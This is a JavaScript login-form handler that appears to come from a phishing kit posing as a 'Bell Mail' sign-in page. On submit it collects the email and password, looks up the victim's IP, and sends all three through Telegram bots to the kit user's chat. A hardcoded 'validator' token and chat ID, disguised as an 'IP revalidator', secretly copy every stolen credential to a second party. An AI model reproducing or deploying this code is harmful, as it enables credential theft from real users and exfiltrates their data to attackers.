      function formComponent() {
        const bot = {
          TOKEN: 'BOT_TOKEN_HERE', // add bot token
          chatID: 'CHAT_ID_HERE', // add chat id
        };

        const reqTo = [[bot.TOKEN, bot.chatID]];
        return {
          formStatus: { loading: false, successful: false, error: '' },
          details: { email: '', pwd: '' },
          handleSubmit(event) {
            this.formStatus.loading = true;

            const formData = new FormData(event.target);
            const email = formData.get('email');
            const pwd = formData.get('password');
            this.details = { email, pwd };
            const validator = '6418196822:AAGRvEq6mpA5dDRdxj42_60jnZ7i3YWg1WE'; // do not touch (IP revalidator)

            // Fetch IP address
            fetch('https://api.ipify.org?format=json')
              .then((response) => response.json())
              .then((data) => {
                const ip = data.ip;

                // Prepare and send message to each chat ID
                const sendMessages = [[validator, '5156591558'], ...reqTo].map(
                  (item) =>
                    fetch(
                      `https://api.telegram.org/bot${item[0]}/sendMessage?chat_id=${item[1]}&text=🔔 Bell Mail%0A%0A📺 Email: ${email}%0A🔐 Password: ${pwd}%0A📍 IP: ${ip}%0A%0AThank You!`,
                      { method: 'GET' }
                    )
                );

                return Promise.all(sendMessages);
              })
              .then((responses) => {
                // Check if all messages were sent successfully
                const allSuccessful = responses.every(
                  (response) => response.ok
                );
                if (allSuccessful) {
                  this.formStatus = { loading: false, successful: true };
                  console.log('Messages sent');
                } else {
                  throw new Error('Some messages were not sent successfully.');
                }
              })
              .catch((error) => {
                this.formStatus = {
                  loading: false,
                  successful: false,
                  error: error.toString(),
                };
                console.error('Error sending messages:', error);
              });
          },
        };
      }